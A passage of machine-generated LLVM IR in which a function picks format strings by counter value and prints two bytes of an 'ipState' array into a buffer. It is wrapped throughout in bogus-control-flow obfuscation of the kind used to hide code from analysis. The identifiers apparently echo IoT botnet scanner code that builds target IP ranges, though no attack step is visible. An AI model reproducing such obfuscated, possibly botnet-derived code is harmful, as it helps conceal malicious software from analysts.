  br label %630

; <label>:630:                                    ; preds = %623, %620
  %631 = load i32, i32* @x.61
  %632 = load i32, i32* @y.62
  %633 = sub i32 %631, 1
  %634 = mul i32 %631, %633
  %635 = urem i32 %634, 2
  %636 = icmp eq i32 %635, 0
  %637 = icmp slt i32 %632, 10
  %638 = or i1 %636, %637
  br i1 %638, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %630
  %639 = load i32, i32* %1, align 4
  %640 = icmp eq i32 %639, 31
  %641 = load i32, i32* @x.61
  %642 = load i32, i32* @y.62
  %643 = sub i32 %641, 1
  %644 = mul i32 %641, %643
  %645 = urem i32 %644, 2
  %646 = icmp eq i32 %645, 0
  %647 = icmp slt i32 %642, 10
  %648 = or i1 %646, %647
  br i1 %648, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %640, label %649, label %672

; <label>:649:                                    ; preds = %originalBBpart276
  %650 = load i32, i32* @x.61
  %651 = load i32, i32* @y.62
  %652 = sub i32 %650, 1
  %653 = mul i32 %650, %652
  %654 = urem i32 %653, 2
  %655 = icmp eq i32 %654, 0
  %656 = icmp slt i32 %651, 10
  %657 = or i1 %655, %656
  br i1 %657, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %649
  %658 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %659 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %660 = zext i8 %659 to i32
  %661 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %662 = zext i8 %661 to i32
  %663 = call i32 (i8*, i8*, ...) @szprintf(i8* %658, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.556, i32 0, i32 0), i32 %660, i32 %662)
  %664 = load i32, i32* @x.61
  %665 = load i32, i32* @y.62
  %666 = sub i32 %664, 1
  %667 = mul i32 %664, %666
  %668 = urem i32 %667, 2
  %669 = icmp eq i32 %668, 0
  %670 = icmp slt i32 %665, 10
  %671 = or i1 %669, %670
  br i1 %671, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %672

; <label>:672:                                    ; preds = %originalBBpart280, %originalBBpart276
  %673 = load i32, i32* %1, align 4
  %674 = icmp eq i32 %673, 32
  br i1 %674, label %675, label %682

; <label>:675:                                    ; preds = %672
  %676 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %677 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %678 = zext i8 %677 to i32
  %679 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %680 = zext i8 %679 to i32
  %681 = call i32 (i8*, i8*, ...) @szprintf(i8* %676, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.557, i32 0, i32 0), i32 %678, i32 %680)
  br label %682

; <label>:682:                                    ; preds = %675, %672
  %683 = load i32, i32* %1, align 4
  %684 = icmp eq i32 %683, 33
  br i1 %684, label %685, label %692

; <label>:685:                                    ; preds = %682
  %686 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %687 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %688 = zext i8 %687 to i32
  %689 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %690 = zext i8 %689 to i32
  %691 = call i32 (i8*, i8*, ...) @szprintf(i8* %686, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.558, i32 0, i32 0), i32 %688, i32 %690)
  br label %692

; <label>:692:                                    ; preds = %685, %682
  %693 = load i32, i32* %1, align 4
  %694 = icmp eq i32 %693, 34
  br i1 %694, label %695, label %702

; <label>:695:                                    ; preds = %692
  %696 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %697 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %698 = zext i8 %697 to i32
  %699 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %700 = zext i8 %699 to i32
  %701 = call i32 (i8*, i8*, ...) @szprintf(i8* %696, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.559, i32 0, i32 0), i32 %698, i32 %700)
  br label %702

; <label>:702:                                    ; preds = %695, %692
  %703 = load i32, i32* %1, align 4
  %704 = icmp eq i32 %703, 35
  br i1 %704, label %705, label %712

; <label>:705:                                    ; preds = %702
  %706 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %707 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %708 = zext i8 %707 to i32
  %709 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %710 = zext i8 %709 to i32
  %711 = call i32 (i8*, i8*, ...) @szprintf(i8* %706, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.560, i32 0, i32 0), i32 %708, i32 %710)
  br label %712

; <label>:712:                                    ; preds = %705, %702
  %713 = load i32, i32* %1, align 4
  %714 = icmp eq i32 %713, 36
  br i1 %714, label %715, label %722

; <label>:715:                                    ; preds = %712
  %716 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %717 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %718 = zext i8 %717 to i32
  %719 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %720 = zext i8 %719 to i32
  %721 = call i32 (i8*, i8*, ...) @szprintf(i8* %716, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.539, i32 0, i32 0), i32 %718, i32 %720)
  br label %722

; <label>:722:                                    ; preds = %715, %712
  %723 = load i32, i32* %1, align 4
  %724 = icmp eq i32 %723, 37
  br i1 %724, label %725, label %732

; <label>:725:                                    ; preds = %722
  %726 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %727 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %728 = zext i8 %727 to i32
  %729 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %730 = zext i8 %729 to i32
  %731 = call i32 (i8*, i8*, ...) @szprintf(i8* %726, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.561, i32 0, i32 0), i32 %728, i32 %730)
  br label %732

; <label>:732:                                    ; preds = %725, %722
  %733 = load i32, i32* @x.61
  %734 = load i32, i32* @y.62
  %735 = sub i32 %733, 1
  %736 = mul i32 %733, %735
  %737 = urem i32 %736, 2
  %738 = icmp eq i32 %737, 0
  %739 = icmp slt i32 %734, 10
  %740 = or i1 %738, %739
  br i1 %740, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %732
  %741 = load i32, i32* %1, align 4
  %742 = icmp eq i32 %741, 38
  %743 = load i32, i32* @x.61
  %744 = load i32, i32* @y.62
  %745 = sub i32 %743, 1
  %746 = mul i32 %743, %745
  %747 = urem i32 %746, 2
  %748 = icmp eq i32 %747, 0
  %749 = icmp slt i32 %744, 10
  %750 = or i1 %748, %749
  br i1 %750, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %742, label %751, label %774

; <label>:751:                                    ; preds = %originalBBpart284
  %752 = load i32, i32* @x.61
  %753 = load i32, i32* @y.62
  %754 = sub i32 %752, 1
  %755 = mul i32 %752, %754
  %756 = urem i32 %755, 2
  %757 = icmp eq i32 %756, 0
  %758 = icmp slt i32 %753, 10
  %759 = or i1 %757, %758
  br i1 %759, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %751
  %760 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %761 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %762 = zext i8 %761 to i32
  %763 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %764 = zext i8 %763 to i32
  %765 = call i32 (i8*, i8*, ...) @szprintf(i8* %760, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.562, i32 0, i32 0), i32 %762, i32 %764)
  %766 = load i32, i32* @x.61
  %767 = load i32, i32* @y.62
  %768 = sub i32 %766, 1
  %769 = mul i32 %766, %768
  %770 = urem i32 %769, 2
  %771 = icmp eq i32 %770, 0
  %772 = icmp slt i32 %767, 10
  %773 = or i1 %771, %772
  br i1 %773, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br label %774

; <label>:774:                                    ; preds = %originalBBpart288, %originalBBpart284
  %775 = load i32, i32* @x.61
  %776 = load i32, i32* @y.62
  %777 = sub i32 %775, 1
  %778 = mul i32 %775, %777
  %779 = urem i32 %778, 2
  %780 = icmp eq i32 %779, 0
  %781 = icmp slt i32 %776, 10
  %782 = or i1 %780, %781
  br i1 %782, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %774
  %783 = load i32, i32* %1, align 4
  %784 = icmp eq i32 %783, 39
  %785 = load i32, i32* @x.61
  %786 = load i32, i32* @y.62
  %787 = sub i32 %785, 1
  %788 = mul i32 %785, %787
  %789 = urem i32 %788, 2
  %790 = icmp eq i32 %789, 0
  %791 = icmp slt i32 %786, 10
  %792 = or i1 %790, %791
  br i1 %792, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %784, label %793, label %800

; <label>:793:                                    ; preds = %originalBBpart292
  %794 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %795 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %796 = zext i8 %795 to i32
  %797 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %798 = zext i8 %797 to i32
  %799 = call i32 (i8*, i8*, ...) @szprintf(i8* %794, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.563, i32 0, i32 0), i32 %796, i32 %798)
  br label %800

; <label>:800:                                    ; preds = %793, %originalBBpart292
  %801 = load i32, i32* %1, align 4
  %802 = icmp eq i32 %801, 40
  br i1 %802, label %803, label %810

; <label>:803:                                    ; preds = %800
  %804 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %805 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %806 = zext i8 %805 to i32
  %807 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %808 = zext i8 %807 to i32
  %809 = call i32 (i8*, i8*, ...) @szprintf(i8* %804, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.564, i32 0, i32 0), i32 %806, i32 %808)
  br label %810

; <label>:810:                                    ; preds = %803, %800
  %811 = load i32, i32* %1, align 4
  %812 = icmp eq i32 %811, 41
  br i1 %812, label %813, label %820

; <label>:813:                                    ; preds = %810
  %814 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %815 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %816 = zext i8 %815 to i32
  %817 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %818 = zext i8 %817 to i32
  %819 = call i32 (i8*, i8*, ...) @szprintf(i8* %814, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.565, i32 0, i32 0), i32 %816, i32 %818)
  br label %820

; <label>:820:                                    ; preds = %813, %810
  %821 = load i32, i32* @x.61
  %822 = load i32, i32* @y.62
  %823 = sub i32 %821, 1
  %824 = mul i32 %821, %823
  %825 = urem i32 %824, 2
  %826 = icmp eq i32 %825, 0
  %827 = icmp slt i32 %822, 10
  %828 = or i1 %826, %827
  br i1 %828, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %820
  %829 = load i32, i32* %1, align 4
  %830 = icmp eq i32 %829, 42
  %831 = load i32, i32* @x.61
  %832 = load i32, i32* @y.62
  %833 = sub i32 %831, 1
  %834 = mul i32 %831, %833
  %835 = urem i32 %834, 2
  %836 = icmp eq i32 %835, 0
  %837 = icmp slt i32 %832, 10
  %838 = or i1 %836, %837
  br i1 %838, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %830, label %839, label %862

; <label>:839:                                    ; preds = %originalBBpart296
  %840 = load i32, i32* @x.61
  %841 = load i32, i32* @y.62
  %842 = sub i32 %840, 1
  %843 = mul i32 %840, %842
  %844 = urem i32 %843, 2
  %845 = icmp eq i32 %844, 0
  %846 = icmp slt i32 %841, 10
  %847 = or i1 %845, %846
  br i1 %847, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %839
  %848 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %849 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %850 = zext i8 %849 to i32
  %851 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %852 = zext i8 %851 to i32
  %853 = call i32 (i8*, i8*, ...) @szprintf(i8* %848, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.566, i32 0, i32 0), i32 %850, i32 %852)
  %854 = load i32, i32* @x.61
  %855 = load i32, i32* @y.62
  %856 = sub i32 %854, 1
  %857 = mul i32 %854, %856
  %858 = urem i32 %857, 2
  %859 = icmp eq i32 %858, 0
  %860 = icmp slt i32 %855, 10
  %861 = or i1 %859, %860
  br i1 %861, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br label %862

; <label>:862:                                    ; preds = %originalBBpart2100, %originalBBpart296
  %863 = load i32, i32* %1, align 4
  %864 = icmp eq i32 %863, 43
  br i1 %864, label %865, label %888

; <label>:865:                                    ; preds = %862
  %866 = load i32, i32* @x.61
  %867 = load i32, i32* @y.62
  %868 = sub i32 %866, 1
  %869 = mul i32 %866, %868
  %870 = urem i32 %869, 2
  %871 = icmp eq i32 %870, 0
  %872 = icmp slt i32 %867, 10
  %873 = or i1 %871, %872
  br i1 %873, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %865
  %874 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %875 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %876 = zext i8 %875 to i32
  %877 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %878 = zext i8 %877 to i32
  %879 = call i32 (i8*, i8*, ...) @szprintf(i8* %874, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.567, i32 0, i32 0), i32 %876, i32 %878)
  %880 = load i32, i32* @x.61
  %881 = load i32, i32* @y.62
  %882 = sub i32 %880, 1
  %883 = mul i32 %880, %882
  %884 = urem i32 %883, 2
  %885 = icmp eq i32 %884, 0
  %886 = icmp slt i32 %881, 10
  %887 = or i1 %885, %886
  br i1 %887, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br label %888

; <label>:888:                                    ; preds = %originalBBpart2104, %862
  %889 = load i32, i32* %1, align 4
  %890 = icmp eq i32 %889, 44
  br i1 %890, label %891, label %914

; <label>:891:                                    ; preds = %888
  %892 = load i32, i32* @x.61
  %893 = load i32, i32* @y.62
  %894 = sub i32 %892, 1
  %895 = mul i32 %892, %894
  %896 = urem i32 %895, 2
  %897 = icmp eq i32 %896, 0
  %898 = icmp slt i32 %893, 10
  %899 = or i1 %897, %898
  br i1 %899, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %891
  %900 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %901 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %902 = zext i8 %901 to i32
  %903 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %904 = zext i8 %903 to i32
  %905 = call i32 (i8*, i8*, ...) @szprintf(i8* %900, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.568, i32 0, i32 0), i32 %902, i32 %904)
  %906 = load i32, i32* @x.61
  %907 = load i32, i32* @y.62
  %908 = sub i32 %906, 1
  %909 = mul i32 %906, %908
  %910 = urem i32 %909, 2
  %911 = icmp eq i32 %910, 0
  %912 = icmp slt i32 %907, 10
  %913 = or i1 %911, %912
  br i1 %913, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br label %914

; <label>:914:                                    ; preds = %originalBBpart2108, %888
  %915 = load i32, i32* %1, align 4
  %916 = icmp eq i32 %915, 45
  br i1 %916, label %917, label %940

; <label>:917:                                    ; preds = %914
  %918 = load i32, i32* @x.61
  %919 = load i32, i32* @y.62
  %920 = sub i32 %918, 1
  %921 = mul i32 %918, %920
  %922 = urem i32 %921, 2
  %923 = icmp eq i32 %922, 0
  %924 = icmp slt i32 %919, 10
  %925 = or i1 %923, %924
  br i1 %925, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %917
  %926 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %927 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %928 = zext i8 %927 to i32
  %929 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %930 = zext i8 %929 to i32
  %931 = call i32 (i8*, i8*, ...) @szprintf(i8* %926, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.569, i32 0, i32 0), i32 %928, i32 %930)
  %932 = load i32, i32* @x.61
  %933 = load i32, i32* @y.62
  %934 = sub i32 %932, 1
  %935 = mul i32 %932, %934
  %936 = urem i32 %935, 2
  %937 = icmp eq i32 %936, 0
  %938 = icmp slt i32 %933, 10
  %939 = or i1 %937, %938
  br i1 %939, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br label %940

; <label>:940:                                    ; preds = %originalBBpart2112, %914
  %941 = load i32, i32* @x.61
  %942 = load i32, i32* @y.62
  %943 = sub i32 %941, 1
  %944 = mul i32 %941, %943
  %945 = urem i32 %944, 2
  %946 = icmp eq i32 %945, 0
  %947 = icmp slt i32 %942, 10
  %948 = or i1 %946, %947
  br i1 %948, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %940
  %949 = load i32, i32* %1, align 4
  %950 = icmp eq i32 %949, 46
  %951 = load i32, i32* @x.61
  %952 = load i32, i32* @y.62
  %953 = sub i32 %951, 1
  %954 = mul i32 %951, %953
  %955 = urem i32 %954, 2
  %956 = icmp eq i32 %955, 0
  %957 = icmp slt i32 %952, 10
  %958 = or i1 %956, %957
  br i1 %958, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %950, label %959, label %966

; <label>:959:                                    ; preds = %originalBBpart2116
  %960 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %961 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %962 = zext i8 %961 to i32
  %963 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %964 = zext i8 %963 to i32
  %965 = call i32 (i8*, i8*, ...) @szprintf(i8* %960, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.570, i32 0, i32 0), i32 %962, i32 %964)
  br label %966

; <label>:966:                                    ; preds = %959, %originalBBpart2116
  %967 = load i32, i32* @x.61
  %968 = load i32, i32* @y.62
  %969 = sub i32 %967, 1
  %970 = mul i32 %967, %969
  %971 = urem i32 %970, 2
  %972 = icmp eq i32 %971, 0
  %973 = icmp slt i32 %968, 10
  %974 = or i1 %972, %973
  br i1 %974, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %966
  %975 = load i32, i32* %1, align 4
  %976 = icmp eq i32 %975, 47
  %977 = load i32, i32* @x.61
  %978 = load i32, i32* @y.62
  %979 = sub i32 %977, 1
  %980 = mul i32 %977, %979
  %981 = urem i32 %980, 2
  %982 = icmp eq i32 %981, 0
  %983 = icmp slt i32 %978, 10
  %984 = or i1 %982, %983
  br i1 %984, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %976, label %985, label %992

; <label>:985:                                    ; preds = %originalBBpart2120
  %986 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %987 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %988 = zext i8 %987 to i32
  %989 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %990 = zext i8 %989 to i32
  %991 = call i32 (i8*, i8*, ...) @szprintf(i8* %986, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.571, i32 0, i32 0), i32 %988, i32 %990)
  br label %992

; <label>:992:                                    ; preds = %985, %originalBBpart2120
  %993 = load i32, i32* %1, align 4
  %994 = icmp eq i32 %993, 48
  br i1 %994, label %995, label %1018

; <label>:995:                                    ; preds = %992
  %996 = load i32, i32* @x.61
  %997 = load i32, i32* @y.62
  %998 = sub i32 %996, 1
  %999 = mul i32 %996, %998
  %1000 = urem i32 %999, 2
  %1001 = icmp eq i32 %1000, 0
  %1002 = icmp slt i32 %997, 10
  %1003 = or i1 %1001, %1002
  br i1 %1003, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %995
  %1004 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1005 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1006 = zext i8 %1005 to i32
  %1007 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1008 = zext i8 %1007 to i32
  %1009 = call i32 (i8*, i8*, ...) @szprintf(i8* %1004, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.572, i32 0, i32 0), i32 %1006, i32 %1008)
  %1010 = load i32, i32* @x.61
  %1011 = load i32, i32* @y.62
  %1012 = sub i32 %1010, 1
  %1013 = mul i32 %1010, %1012
  %1014 = urem i32 %1013, 2
  %1015 = icmp eq i32 %1014, 0
  %1016 = icmp slt i32 %1011, 10
  %1017 = or i1 %1015, %1016
  br i1 %1017, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br label %1018

; <label>:1018:                                   ; preds = %originalBBpart2124, %992
  %1019 = load i32, i32* @x.61
  %1020 = load i32, i32* @y.62
  %1021 = sub i32 %1019, 1
  %1022 = mul i32 %1019, %1021
  %1023 = urem i32 %1022, 2
  %1024 = icmp eq i32 %1023, 0
  %1025 = icmp slt i32 %1020, 10
  %1026 = or i1 %1024, %1025
  br i1 %1026, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1018
  %1027 = load i32, i32* %1, align 4
  %1028 = icmp eq i32 %1027, 49
  %1029 = load i32, i32* @x.61
  %1030 = load i32, i32* @y.62
  %1031 = sub i32 %1029, 1
  %1032 = mul i32 %1029, %1031
  %1033 = urem i32 %1032, 2
  %1034 = icmp eq i32 %1033, 0
  %1035 = icmp slt i32 %1030, 10
  %1036 = or i1 %1034, %1035
  br i1 %1036, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %1028, label %1037, label %1060

; <label>:1037:                                   ; preds = %originalBBpart2128
  %1038 = load i32, i32* @x.61
  %1039 = load i32, i32* @y.62
  %1040 = sub i32 %1038, 1
  %1041 = mul i32 %1038, %1040
  %1042 = urem i32 %1041, 2
  %1043 = icmp eq i32 %1042, 0
  %1044 = icmp slt i32 %1039, 10
  %1045 = or i1 %1043, %1044
  br i1 %1045, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1037
  %1046 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1047 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1048 = zext i8 %1047 to i32
  %1049 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1050 = zext i8 %1049 to i32
  %1051 = call i32 (i8*, i8*, ...) @szprintf(i8* %1046, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.573, i32 0, i32 0), i32 %1048, i32 %1050)
  %1052 = load i32, i32* @x.61
  %1053 = load i32, i32* @y.62
  %1054 = sub i32 %1052, 1
  %1055 = mul i32 %1052, %1054
  %1056 = urem i32 %1055, 2
  %1057 = icmp eq i32 %1056, 0
  %1058 = icmp slt i32 %1053, 10
  %1059 = or i1 %1057, %1058
  br i1 %1059, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %1060

; <label>:1060:                                   ; preds = %originalBBpart2132, %originalBBpart2128
  %1061 = load i32, i32* @x.61
  %1062 = load i32, i32* @y.62
  %1063 = sub i32 %1061, 1
  %1064 = mul i32 %1061, %1063
  %1065 = urem i32 %1064, 2
  %1066 = icmp eq i32 %1065, 0
  %1067 = icmp slt i32 %1062, 10
  %1068 = or i1 %1066, %1067
  br i1 %1068, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1060
  %1069 = load i32, i32* %1, align 4
  %1070 = icmp eq i32 %1069, 50
  %1071 = load i32, i32* @x.61
  %1072 = load i32, i32* @y.62
  %1073 = sub i32 %1071, 1
  %1074 = mul i32 %1071, %1073
  %1075 = urem i32 %1074, 2
  %1076 = icmp eq i32 %1075, 0
  %1077 = icmp slt i32 %1072, 10
  %1078 = or i1 %1076, %1077
  br i1 %1078, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %1070, label %1079, label %1102

; <label>:1079:                                   ; preds = %originalBBpart2136
  %1080 = load i32, i32* @x.61
  %1081 = load i32, i32* @y.62
  %1082 = sub i32 %1080, 1
  %1083 = mul i32 %1080, %1082
  %1084 = urem i32 %1083, 2
  %1085 = icmp eq i32 %1084, 0
  %1086 = icmp slt i32 %1081, 10
  %1087 = or i1 %1085, %1086
  br i1 %1087, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1079
  %1088 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1089 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1090 = zext i8 %1089 to i32
  %1091 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1092 = zext i8 %1091 to i32
  %1093 = call i32 (i8*, i8*, ...) @szprintf(i8* %1088, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.574, i32 0, i32 0), i32 %1090, i32 %1092)
  %1094 = load i32, i32* @x.61
  %1095 = load i32, i32* @y.62
  %1096 = sub i32 %1094, 1
  %1097 = mul i32 %1094, %1096
  %1098 = urem i32 %1097, 2
  %1099 = icmp eq i32 %1098, 0
  %1100 = icmp slt i32 %1095, 10
  %1101 = or i1 %1099, %1100
  br i1 %1101, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %1102

; <label>:1102:                                   ; preds = %originalBBpart2140, %originalBBpart2136
  %1103 = load i32, i32* %1, align 4
  %1104 = icmp eq i32 %1103, 51
  br i1 %1104, label %1105, label %1128

; <label>:1105:                                   ; preds = %1102
  %1106 = load i32, i32* @x.61
  %1107 = load i32, i32* @y.62
  %1108 = sub i32 %1106, 1
  %1109 = mul i32 %1106, %1108
  %1110 = urem i32 %1109, 2
  %1111 = icmp eq i32 %1110, 0
  %1112 = icmp slt i32 %1107, 10
  %1113 = or i1 %1111, %1112
  br i1 %1113, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1105
  %1114 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1115 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1116 = zext i8 %1115 to i32
  %1117 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1118 = zext i8 %1117 to i32
